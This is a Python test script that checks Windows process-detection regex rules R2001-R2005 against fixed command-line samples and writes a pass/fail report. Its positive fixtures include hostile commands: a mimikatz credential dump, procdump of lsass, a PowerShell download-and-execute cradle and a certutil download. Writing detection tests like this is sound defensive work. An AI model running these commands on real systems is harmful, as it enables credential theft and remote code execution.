#!/usr/bin/env python3
"""Observe-only synthetic command-line canary for R2001-R2005."""
from __future__ import annotations

import argparse
import json
import re
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT / "configs" / "Rules.json"
TARGETS = ("R2001", "R2002", "R2003", "R2004", "R2005")
CASES = {
    "R2001": (r"C:\\Lab\\mimikatz.exe sekurlsa::logonpasswords", r"C:\\Windows\\System32\\whoami.exe"),
    "R2002": (r"C:\\Windows\\System32\\svchost.exe -k netsvcs PROCESS_HOLLOW", r"C:\\Windows\\System32\\services.exe"),
    "R2003": (r"powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')", r"powershell.exe -NoProfile -File C:\\Lab\\safe-script.ps1"),
    "R2004": (r"C:\\Windows\\System32\\certutil.exe -urlcache -f https://example.invalid/a C:\\Users\\Public\\a.bin", r"C:\\Lab\\tool.exe -f input.txt"),
    "R2005": (r"C:\\Lab\\procdump.exe -ma lsass.exe C:\\Lab\\out.dmp", r"C:\\Windows\\System32\\tasklist.exe"),
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--report", type=Path)
    args = parser.parse_args()
    rules = {r["rule_id"]: r for r in json.loads(RULES.read_text(encoding="utf-8"))["nids_rules"]}
    errors: list[str] = []
    rows: list[tuple[str, str, bool, bool]] = []
    for rule_id in TARGETS:
        rule = rules.get(rule_id)
        if not rule:
            errors.append(f"missing rule {rule_id}")
            continue
        try:
            pattern = re.compile(rule["regex_pattern"], re.IGNORECASE)
        except re.error as exc:
            errors.append(f"{rule_id}: invalid regex: {exc}")
            continue
        positive, negative = CASES[rule_id]
        positive_match = bool(pattern.search(positive))
        negative_match = bool(pattern.search(negative))
        rows.append((rule_id, positive, positive_match, negative_match))
        if not positive_match:
            errors.append(f"{rule_id}: positive command line did not match")
        if negative_match:
            errors.append(f"{rule_id}: benign command line matched (false positive)")

    status = "PASS" if not errors else "FAIL"
    lines = [
        "# KERNEL_PROCESS Synthetic Rule Canary",
        "",
        f"**Status:** `{status}`",
        "",
        "This scan compiles R2001-R2005 regexes against in-memory command-line fixtures only. It does not create a process, execute a command, access a URL, dump credentials, or invoke enforcement.",
        "",
        "| Rule | Positive command line | Positive match | Benign match |",
        "|---|---|---:|---:|",
    ]
    lines.extend(f"| `{rid}` | `{cmd}` | `{pos}` | `{neg}` |" for rid, cmd, pos, neg in rows)
    lines += ["", "## Findings", ""]
    lines.extend(f"- **ERROR:** {item}" for item in errors) if errors else lines.append("- All five configured regexes matched the positive fixture and rejected the benign fixture.")
    lines += ["", "## Sensor boundary note", "", "The canary proves command-line pattern behavior only. Full process-sensor qualification still requires a Windows ETW event with ImageName, CommandLine, ParentId, canonical event, and forensic record; prevention remains closed.", ""]
    report = "\n".join(lines)
    print(report)
    if args.report:
        args.report.parent.mkdir(parents=True, exist_ok=True)
        args.report.write_text(report + "\n", encoding="utf-8")
    return 0 if not errors else 1


if __name__ == "__main__":
    raise SystemExit(main())
